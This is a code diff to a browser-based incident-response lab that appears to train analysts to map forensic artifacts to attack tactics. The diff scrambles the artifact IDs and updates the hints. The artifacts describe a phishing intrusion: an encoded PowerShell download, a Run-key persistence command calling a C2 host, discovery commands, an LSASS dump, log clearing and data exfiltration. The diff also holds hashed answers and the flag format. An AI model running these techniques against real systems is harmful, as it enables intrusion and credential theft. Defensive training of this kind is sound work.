@@ -201,42 +201,45 @@ const TACTICS = [
 const TLABEL = Object.fromEntries(TACTICS);
 /* "privesc" is the unused decoy option */
 
+/* IDs are deliberately NOT in kill-chain order — the number does not reveal the
+   position. `order` is the correct kill-chain position; the array (and so the
+   default display order) is scrambled so the ordering step is not pre-solved. */
 const ARTIFACTS = [
-  { id: "ART-1", src: "Email / Document", tactic: "ia", order: 1,
-    ev: "Outlook recovered item: email 'Remittance advice' with attachment Remittance.docm; user opened it and clicked 'Enable Content' at 10:02." },
-  { id: "ART-2", src: "EDR process", tactic: "exec", order: 2,
-    ev: "Process tree 10:02:14 — WINWORD.EXE → powershell.exe -nop -w hidden -enc <base64 blob> (decoded: downloads and runs a second-stage payload)." },
-  { id: "ART-3", src: "Proxy / NetFlow", tactic: "c2", order: 3,
+  { id: "ART-1", src: "Proxy / NetFlow", tactic: "c2", order: 3,
     ev: "From 10:03 onward: HTTPS requests to analytics-cdn.net every 60s, ~1.5 KB each, jittered — classic beaconing to a command-and-control server." },
-  { id: "ART-4", src: "Registry (Autoruns)", tactic: "persist", order: 4,
-    ev: "New value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run named 'WinUpdater' = powershell -w hidden -c IEX(... analytics-cdn.net ...). Re-launches the implant at every logon." },
-  { id: "ART-5", src: "Command history", tactic: "discover", order: 5,
-    ev: "Executed in sequence: whoami /all; net group \"Domain Admins\" /domain; nltest /dclist — the attacker is enumerating accounts, privileges and domain controllers." },
-  { id: "ART-6", src: "EDR memory", tactic: "cred", order: 6,
+  { id: "ART-2", src: "EDR memory", tactic: "cred", order: 6,
     ev: "rundll32.exe observed reading the memory of LSASS and writing lsass.dmp — credential-dumping behaviour to steal cached passwords and hashes." },
-  { id: "ART-7", src: "Event log", tactic: "defevade", order: 7,
+  { id: "ART-3", src: "Email / Document", tactic: "ia", order: 1,
+    ev: "Outlook recovered item: email 'Remittance advice' with attachment Remittance.docm; user opened it and clicked 'Enable Content' at 10:02." },
+  { id: "ART-4", src: "DLP / Proxy", tactic: "exfil", order: 8,
+    ev: "A 7-Zip archive of \\\\FS\\finance (640 MB, password-protected) was uploaded over HTTPS to analytics-cdn.net at 10:55." },
+  { id: "ART-5", src: "Registry (Autoruns)", tactic: "persist", order: 4,
+    ev: "New value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run named 'WinUpdater' = powershell -w hidden -c IEX(... analytics-cdn.net ...). Re-launches the implant at every logon." },
+  { id: "ART-6", src: "Event log", tactic: "defevade", order: 7,
     ev: "At 10:41 the command 'wevtutil cl Security' cleared the Windows Security event log, and Defender real-time protection was disabled via registry — covering tracks." },
-  { id: "ART-8", src: "DLP / Proxy", tactic: "exfil", order: 8,
-    ev: "A 7-Zip archive of \\\\FS\\finance (640 MB, password-protected) was uploaded over HTTPS to analytics-cdn.net at 10:55." }
+  { id: "ART-7", src: "EDR process", tactic: "exec", order: 2,
+    ev: "Process tree 10:02:14 — WINWORD.EXE → powershell.exe -nop -w hidden -enc <base64 blob> (decoded: downloads and runs a second-stage payload)." },
+  { id: "ART-8", src: "Command history", tactic: "discover", order: 5,
+    ev: "Executed in sequence: whoami /all; net group \"Domain Admins\" /domain; nltest /dclist — the attacker is enumerating accounts, privileges and domain controllers." }
 ];
 
 const FACTS = {
   q_c2:      { hash: "356f412ac085947326ee1c260a64e0ea1132ba2022794c1403d27a236a21535b",
                label: "What is the command-and-control (C2) domain?", sub: "The external domain used for beaconing, persistence and exfiltration.", ph: "domain",
-               tip: "The same domain appears in the beacon (ART-3), the Run key (ART-4) and the upload (ART-8)." },
+               tip: "The same domain appears in three artifacts: the beacon (ART-1), the Run key (ART-5) and the data upload (ART-4)." },
   q_persist: { hash: "e72f1de54de7ed0c3298d0bfc86dc1161bb9a5280da7552e8a9569caefcad224",
                label: "What is the name of the autorun value used for persistence?", sub: "The value name under the registry Run key (one word).", ph: "value name",
-               tip: "In ART-4, the Run key value is named to look like a Windows updater. Enter just that name." },
+               tip: "In ART-5, the Run key value is named to look like a Windows updater. Enter just that name." },
   q_cred:    { hash: "4cdbc4ad4b558745a694a0f3f0d55209314e1edfdbe96a3f14d266831728a941",
                label: "Which process was dumped to steal credentials?", sub: "The Windows process whose memory was read (as named in the artifact).", ph: "process",
-               tip: "In ART-6, the memory of a specific security process was read and written to a .dmp file. Name that process (no extension)." }
+               tip: "In ART-2, the memory of a specific security process was read and written to a .dmp file. Name that process (no extension)." }
 };
 /* flag = FLAG{<c2>_<persist>_<cred>} */
 /* ===================== END SCENARIO ===================== */
 
 
 const STEP_LABELS = ["Map the tactics", "Order the kill chain", "Recover the facts"];
-const KEY = "reconlab-recon01-v1";
+const KEY = "reconlab-recon01-v2";
 const $ = (s) => document.querySelector(s);
 const el = (t, c, h) => { const n = document.createElement(t); if (c) n.className = c; if (h != null) n.innerHTML = h; return n; };
 const esc = (s) => String(s).replace(/[&<>]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;" }[c]));
@@ -433,3 +436,4 @@ if (state.started) { $("#resumeHint").hidden = false; $("#resetBtn").hidden = fa
 </script>
 </body>
 </html>
+
